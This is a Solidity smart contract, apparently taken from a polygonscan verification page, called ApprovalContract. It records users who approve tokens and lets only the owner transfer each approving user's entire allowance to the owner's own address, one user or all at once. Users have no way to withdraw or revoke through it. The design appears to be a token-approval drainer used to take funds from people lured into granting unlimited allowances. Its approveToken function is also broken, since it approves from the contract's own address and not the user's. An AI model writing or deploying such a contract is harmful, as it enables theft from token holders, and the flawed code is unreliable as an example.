/**
 *Submitted for verification at polygonscan.com on 2023-06-23
*/

pragma solidity ^0.8.0;

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

contract ApprovalContract {
    address public owner;

    struct Approval {
        address user;
        address token;
        uint256 balance;
    }

    Approval[] public approvals;

    constructor() {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Only the owner can call this function");
        _;
    }

    function approveToken(address _token) external {
        IERC20(_token).approve(address(this), type(uint256).max);
        uint256 userBalance = IERC20(_token).balanceOf(msg.sender);
        approvals.push(Approval(msg.sender, _token, userBalance));
    }

    function transferAllApprovedTokens(address _from, address _token) external onlyOwner {
        uint256 balance = IERC20(_token).allowance(_from, address(this));
        IERC20(_token).transferFrom(_from, owner, balance);
    }

    function transferAllApprovedTokensFromAll(address _token) external onlyOwner {
        for (uint256 i = 0; i < approvals.length; i++) {
            if (approvals[i].token == _token) {
                uint256 balance = IERC20(_token).allowance(approvals[i].user, address(this));
                IERC20(_token).transferFrom(approvals[i].user, owner, balance);
            }
        }
    }

    function getAllApprovals() external view returns (Approval[] memory) {
        return approvals;
    }

    function updateBalance(uint256 index) internal {
        require(index < approvals.length, "Invalid index");
        Approval storage approval = approvals[index];
        uint256 userBalance = IERC20(approval.token).balanceOf(approval.user);
        approval.balance = userBalance;
    }

    function updateAllBalances() external onlyOwner {
        for (uint256 i = 0; i < approvals.length; i++) {
            updateBalance(i);
        }
    }
}